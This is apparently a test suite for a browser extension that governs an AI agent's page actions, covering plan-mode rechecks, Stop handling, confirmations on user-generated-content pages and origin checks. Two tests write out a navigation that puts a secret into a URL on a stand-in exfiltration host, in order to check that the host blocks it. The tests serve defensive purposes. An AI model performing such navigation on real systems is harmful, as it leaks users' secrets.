import { describe, expect, test } from 'bun:test';
import {
  bindPageToolAuthority,
  createPageToolAuthority,
} from '../../extension/background/page-tool-authority.js';
import {
  HOST_EFFECT_OUTCOME,
  safeHostEffectFailure,
  stampAuthorityToolResultBlock,
} from '../../extension/background/host-effect-verdict.js';

describe('exact page authority', () => {
  const pageContext = (over: Record<string, any> = {}) => {
    let href = over.href ?? 'https://www.wikipedia.org/wiki/Test';
    let documentId = 'document-1';
    let actionCalls = 0;
    const ctx = {
      actorType: 'web', backing: 'tab', activeTab: { id: 7, url: href },
      permission: { mode: 'act', confirmActions: false },
      readAuthorityPermission: async () => ({ mode: 'act', confirmActions: false }),
      denylist: [], ensureBrowserNetworkGuard: async () => ({ ok: true }),
      armBrowserChildQuarantine: async () => ({ ok: true }),
      tabs: { get: async () => ({ id: 7, url: href }) },
      scripting: {
        executeScript: async (request: any) => {
          if (!request.target.documentIds) return [{
            documentId,
            result: { origin: new URL(href).origin, href, timeOrigin: 1 },
          }];
          if (!request.args) return [{ documentId, result: { has: false, capped: false } }];
          actionCalls += 1;
          return [{ documentId, result: {
            ok: true, clicked: true, tag: 'BUTTON', text: 'Save', matchedCount: 1, nth: 0,
          } }];
        },
      },
      ...over,
    };
    return {
      ctx,
      actionCalls: () => actionCalls,
      move: (nextHref: string) => { href = nextHref; documentId = 'document-2'; },
    };
  };

  test('runs page code with authority-owned capability limits and run identity', async () => {
    const observed: any[] = [];
    const page = pageContext();
    const authority = createPageToolAuthority({
      binding: { operation: 'turn.page.run-program', args: {
        code: 'return 42', timeoutMs: 999_999, tabId: 7,
      } },
      ctx: {
        ...page.ctx,
        session: { sessionId: 'actor-web-1' },
        jsOffscreenClient: {
          execHeadless: async (code: string, options: any) => {
            observed.push({ code, options });
            return { value: 42, error: null };
          },
        },
        scriptRuns: {
          mintRunId: () => 'page-run-1',
          register: (...args: any[]) => observed.push({ register: args }),
          release: (...args: any[]) => observed.push({ release: args }),
        },
      },
    });
    await expect(authority.runOwnedPageProgram()).resolves
      .toEqual({ value: 42, error: null });
    expect(observed[0].register).toEqual([
      'page-run-1', undefined, 'actor-web-1', { page: true },
    ]);
    expect(observed[1]).toMatchObject({
      code: 'return 42',
      options: {
        timeoutMs: 180_000,
        caps: { page: true, egress: false, subagent: false, opfs: false },
        ownerSessionId: 'actor-web-1', runId: 'page-run-1',
      },
    });
    expect(observed[2].release).toEqual(['page-run-1']);
  });

  test('refuses a handler that does not match the admitted tool', () => {
    const authority = createPageToolAuthority({
      binding: { operation: 'turn.page.snapshot', args: {} }, ctx: {},
    });
    expect(() => authority.clickOwnedTarget()).toThrow('page authority mismatch');
  });

  test('refuses every page operation for an origin-pinned API Web actor', () => {
    expect(() => createPageToolAuthority({
      binding: { operation: 'turn.page.navigate', args: { url: 'https://example.com/' } },
      ctx: {
        actorType: 'web', backing: 'api', actorInstanceId: 'https://api.example.com',
      },
    })).toThrow('page authority mismatch');
  });

  test('forces one live-origin UGC confirmation even when ordinary confirmations are off', async () => {
    let prompts = 0;
    const page = pageContext({
      href: 'https://github.com/openai/example/issues/42',
      confirm: async (prompt: any) => {
        prompts += 1;
        expect(prompt.origins).toEqual(['https://github.com']);
        expect(prompt.note).toContain('written by other people');
        return 'no';
      },
    });
    const authority = createPageToolAuthority({
      binding: { operation: 'turn.page.click', args: { selector: '#save', tabId: 7 } },
      ctx: page.ctx,
    });
    const result = await authority.clickOwnedTarget();
    expect(result).toMatchObject({
      ok: false, code: 'declined', outcomeKind: 'pre-effect-failure', retryable: false,
      authorityPolicy: { ugcZone: 'github-issues-pulls' },
    });
    expect(stampAuthorityToolResultBlock([{
      effectId: 'call-1:1', operation: 'turn.page.click', outcome: 'not-performed',
      outcomeKnown: true, performed: false, retryable: false,
      code: 'declined', error: 'declined', ugcZone: 'github-issues-pulls',
    }], { type: 'tool_result', is_error: true, content: 'declined' })).toMatchObject({
      is_error: true,
      authorityPolicy: { ugcZone: 'github-issues-pulls' },
      authorityReceipts: [{ ugcZone: 'github-issues-pulls' }],
    });
    expect({ prompts, actions: page.actionCalls() }).toEqual({ prompts: 1, actions: 0 });
  });

  test('does not prompt an ordinary page action when confirmations are off', async () => {
    let prompts = 0;
    const page = pageContext({ confirm: async () => { prompts += 1; return 'yes_once'; } });
    const authority = createPageToolAuthority({
      binding: { operation: 'turn.page.click', args: { selector: '#save', tabId: 7 } },
      ctx: page.ctx,
    });
    await expect(authority.clickOwnedTarget()).resolves.toMatchObject({ ok: true });
    expect({ prompts, actions: page.actionCalls() }).toEqual({ prompts: 0, actions: 1 });
  });

  test('the host refuses a raw exact cross-origin exfiltration navigation', async () => {
    const secret = Array.from({ length: 180 }, (_, index) =>
      '0123456789abcdef'[(index * 7) % 16]).join('');
    let updates = 0;
    const page = pageContext({
      tabs: {
        get: async () => ({ id: 7, url: 'https://source.example/document' }),
        update: async () => { updates += 1; return {}; },
      },
    });
    const authority = createPageToolAuthority({
      binding: {
        operation: 'turn.page.navigate',
        args: { url: `https://exfil.example/${secret}`, tabId: 7 },
      },
      ctx: page.ctx,
    });
    await expect(authority.navigateOwnedTab()).resolves.toMatchObject({
      ok: false,
      code: 'browser_egress_tripwire_refused',
      outcomeKind: 'pre-effect-failure',
      retryable: false,
    });
    expect(updates).toBe(0);
  });

  test('nested page-program mutations cross the same host egress floor', async () => {
    const secret = Array.from({ length: 180 }, (_, index) =>
      '0123456789abcdef'[(index * 7) % 16]).join('');
    let nested: any;
    let updates = 0;
    const page: any = pageContext({
      session: { sessionId: 'actor-web-1' },
      tabs: {
        get: async () => ({ id: 7, url: 'https://source.example/document' }),
        update: async () => { updates += 1; return {}; },
      },
      scriptRuns: { mintRunId: () => 'run-1', register: () => {}, release: () => {} },
    });
    page.ctx.jsOffscreenClient = { execHeadless: async () => {
      nested = await bindPageToolAuthority({}, {
        operation: 'turn.page.navigate',
        args: { args: { url: `https://exfil.example/${secret}`, tabId: 7 } },
        ctx: page.ctx,
      }).navigateOwnedTab();
      return nested;
    } };
    const outer = createPageToolAuthority({
      binding: { operation: 'turn.page.run-program', args: { code: 'await page.goto(url)' } },
      ctx: page.ctx,
    });
    await expect(outer.runOwnedPageProgram()).resolves.toMatchObject({
      ok: false, code: 'browser_egress_tripwire_refused',
    });
    expect(nested).toMatchObject({ ok: false, code: 'browser_egress_tripwire_refused' });
    expect(updates).toBe(0);
  });

  test('Stop during the live target probe prevents the physical click', async () => {
    let releaseProbe!: () => void;
    let probeStarted!: () => void;
    const probeGate = new Promise<void>((resolve) => { releaseProbe = resolve; });
    const started = new Promise<void>((resolve) => { probeStarted = resolve; });
    const controller = new AbortController();
    let actions = 0;
    const page = pageContext();
    const baseExecute = page.ctx.scripting.executeScript;
    page.ctx.scripting.executeScript = async (request: any) => {
      if (!request.target.documentIds) {
        probeStarted();
        await probeGate;
      }
      if (request.args) actions += 1;
      return baseExecute(request);
    };
    const authority = createPageToolAuthority({
      binding: { operation: 'turn.page.click', args: { selector: '#save', tabId: 7 } },
      ctx: page.ctx, signal: controller.signal,
    });
    const pending = authority.clickOwnedTarget();
    await started;
    controller.abort();
    releaseProbe();
    await expect(pending).resolves.toMatchObject({
      ok: false, error: 'page action was stopped', outcomeKind: 'pre-effect-failure',
    });
    expect(actions).toBe(0);
  });

  test('Stop while child quarantine arms prevents the physical fill', async () => {
    let releaseQuarantine!: () => void;
    let quarantineStarted!: () => void;
    const quarantineGate = new Promise<void>((resolve) => { releaseQuarantine = resolve; });
    const started = new Promise<void>((resolve) => { quarantineStarted = resolve; });
    const controller = new AbortController();
    let actions = 0;
    const page = pageContext({
      armBrowserChildQuarantine: async () => {
        quarantineStarted();
        await quarantineGate;
        return { ok: true };
      },
    });
    const baseExecute = page.ctx.scripting.executeScript;
    page.ctx.scripting.executeScript = async (request: any) => {
      if (request.args) actions += 1;
      return baseExecute(request);
    };
    const authority = createPageToolAuthority({
      binding: { operation: 'turn.page.fill', args: {
        selector: '#comment', text: 'hello', tabId: 7,
      } },
      ctx: page.ctx, signal: controller.signal,
    });
    const pending = authority.fillOwnedTarget();
    await started;
    controller.abort();
    releaseQuarantine();
    await expect(pending).resolves.toMatchObject({
      ok: false, error: 'page action was stopped', outcomeKind: 'pre-effect-failure',
    });
    expect(actions).toBe(0);
  });

  for (const operation of ['click', 'fill', 'run-program'] as const) {
    test(`${operation} rechecks Act at its final physical edge`, async () => {
      let mode = 'act';
      let permissionReads = 0;
      let releasePermission!: () => void;
      let finalReadStarted!: () => void;
      const permissionGate = new Promise<void>((resolve) => { releasePermission = resolve; });
      const started = new Promise<void>((resolve) => { finalReadStarted = resolve; });
      // page programs are composite containers: the outer authority does not
      // resolve or confirm a target, while the exact nested mutation does.
      const finalRead = operation === 'run-program' ? 1 : 4;
      let runs = 0;
      const page = pageContext({
        readAuthorityPermission: async () => {
          permissionReads += 1;
          if (permissionReads === finalRead) {
            finalReadStarted();
            await permissionGate;
          }
          return { mode, confirmActions: false };
        },
        session: { sessionId: 'actor-web-1' },
        jsOffscreenClient: { execHeadless: async () => { runs += 1; return { ok: true }; } },
        scriptRuns: { mintRunId: () => 'run-1', register: () => {}, release: () => {} },
      });
      const authority = createPageToolAuthority({
        binding: operation === 'click'
          ? { operation: 'turn.page.click', args: { selector: '#save', tabId: 7 } }
          : operation === 'fill'
            ? { operation: 'turn.page.fill', args: {
                selector: '#comment', text: 'hello', tabId: 7,
              } }
            : { operation: 'turn.page.run-program', args: {
                code: 'return 1', timeoutMs: 1_000, tabId: 7,
              } },
        ctx: page.ctx,
      });
      const pending = operation === 'click' ? authority.clickOwnedTarget()
        : operation === 'fill' ? authority.fillOwnedTarget()
          : authority.runOwnedPageProgram();
      await started;
      mode = 'plan';
      releasePermission();
      await expect(pending).resolves.toMatchObject({
        ok: false, code: 'plan_mode_refused', outcomeKind: 'pre-effect-failure',
      });
      expect({ actions: page.actionCalls(), runs }).toEqual({ actions: 0, runs: 0 });
    });
  }

  test('refuses when the live document changes during a UGC confirmation', async () => {
    let prompts = 0;
    const page = pageContext({
      href: 'https://github.com/openai/example/issues/42',
      confirm: async () => {
        prompts += 1;
        page.move('https://github.com/settings/profile');
        return 'yes_once';
      },
    });
    const authority = createPageToolAuthority({
      binding: { operation: 'turn.page.fill', args: {
        selector: '#comment', text: 'hello', tabId: 7,
      } },
      ctx: page.ctx,
    });
    await expect(authority.fillOwnedTarget()).resolves.toMatchObject({
      ok: false, code: 'page_target_changed', outcomeKind: 'pre-effect-failure',
    });
    expect({ prompts, actions: page.actionCalls() }).toEqual({ prompts: 1, actions: 0 });
  });

  test('prompts exactly once for a nested UGC mutation, not for the page program container', async () => {
    let runs = 0;
    let prompts = 0;
    let nested: any;
    const page: any = pageContext({
      href: 'https://www.reddit.com/r/example/comments/abc/thread/',
      confirm: async () => { prompts += 1; return false; },
      session: { sessionId: 'actor-web-1' },
      scriptRuns: { mintRunId: () => 'run-1', register: () => {}, release: () => {} },
    });
    page.ctx.jsOffscreenClient = { execHeadless: async () => {
      runs += 1;
      nested = await bindPageToolAuthority({}, {
        operation: 'turn.page.click',
        args: { args: { selector: '#reply', tabId: 7 } },
        ctx: page.ctx,
      }).clickOwnedTarget();
      return nested;
    } };
    const authority = createPageToolAuthority({
      binding: { operation: 'turn.page.run-program', args: { code: 'return 1', tabId: 7 } },
      ctx: page.ctx,
    });
    await expect(authority.runOwnedPageProgram()).resolves.toMatchObject({
      ok: false, code: 'declined', outcomeKind: 'pre-effect-failure',
    });
    expect({ runs, prompts, actions: page.actionCalls() }).toEqual({
      runs: 1, prompts: 1, actions: 0,
    });
  });

  test('a fresh tab-backed Web actor may enter page code before its first tab is adopted', async () => {
    let runs = 0;
    const page = pageContext({
      activeTab: null,
      actorInstanceId: 'web-actor-1',
      session: { sessionId: 'actor-web-1' },
      tabs: {
        get: async () => { throw new Error('no tab exists yet'); },
        query: async () => [],
      },
      jsOffscreenClient: { execHeadless: async () => { runs += 1; return { ok: true }; } },
      scriptRuns: { mintRunId: () => 'run-1', register: () => {}, release: () => {} },
    });
    const authority = createPageToolAuthority({
      binding: { operation: 'turn.page.run-program', args: { code: 'await page.goto(url)' } },
      ctx: page.ctx,
    });
    await expect(authority.runOwnedPageProgram()).resolves.toMatchObject({ ok: true });
    expect(runs).toBe(1);
  });

  test('binds a fresh document for a nested operation after page code navigates', async () => {
    const page = pageContext();
    const state = {};
    let nested: any;
    const ctx = {
      ...page.ctx,
      session: { sessionId: 'actor-web-1' },
      jsOffscreenClient: {
        execHeadless: async () => {
          page.move('https://www.wikipedia.org/wiki/After');
          nested = await bindPageToolAuthority(state, {
            operation: 'turn.page.click',
            args: { args: { selector: '#continue', tabId: 7 } },
            ctx,
          }).clickOwnedTarget();
          return { ok: true };
        },
      },
      scriptRuns: { mintRunId: () => 'run-1', register: () => {}, release: () => {} },
    };
    const outer = bindPageToolAuthority(state, {
      operation: 'turn.page.run-program',
      args: { args: { code: 'await page.goto(); await page.click()', tabId: 7 } },
      ctx,
    });
    await expect(outer.runOwnedPageProgram()).resolves.toMatchObject({ ok: true });
    expect(nested).toMatchObject({ ok: true });
    expect(page.actionCalls()).toBe(1);
  });

  test('classifies proven no-action failures and preserves structured policy refusals', () => {
    expect(HOST_EFFECT_OUTCOME.pageMutation.fulfilled({
      ok: false, error: 'no_match: #missing',
    })).toBe('not-performed');
    expect(HOST_EFFECT_OUTCOME.pageMutation.fulfilled({
      ok: false, error: 'script_inject_failed: frame vanished',
    })).toBe('unknown');
    expect(HOST_EFFECT_OUTCOME.pageMutation.fulfilled({
      ok: false, error: 'origin_lock: navigation landed outside the actor origin',
    })).toBe('unknown');
    const failure = safeHostEffectFailure({
      code: 'browser_private_network_blocked',
      content: 'Private target refused', endTurn: true,
      outcomeKind: 'pre-effect-failure',
      structured: {
        code: 'browser_private_network_blocked', reason: 'private_network',
        stage: 'committed_origin', outcome: 'not_run', retryable: false,
        attackerControlled: 'drop-me',
      },
    });
    expect(failure).toEqual({
      code: 'browser_private_network_blocked', content: 'Private target refused',
      endTurn: true, outcomeKind: 'pre-effect-failure', retryable: false,
      structured: {
        code: 'browser_private_network_blocked', reason: 'private_network',
        stage: 'committed_origin', outcome: 'not_run', retryable: false,
      },
    });
    expect(HOST_EFFECT_OUTCOME.pageMutation.rejected({
      outcomeKind: 'pre-effect-failure',
    })).toBe('not-performed');
    expect(HOST_EFFECT_OUTCOME.repositoryCheckpoint.fulfilled({
      oid: 'same', changed: [], created: false,
    })).toBe('not-performed');
    expect(HOST_EFFECT_OUTCOME.repositoryCheckpoint.fulfilled({
      oid: 'next', changed: ['file.txt'], created: true,
    })).toBe('performed');
  });
});
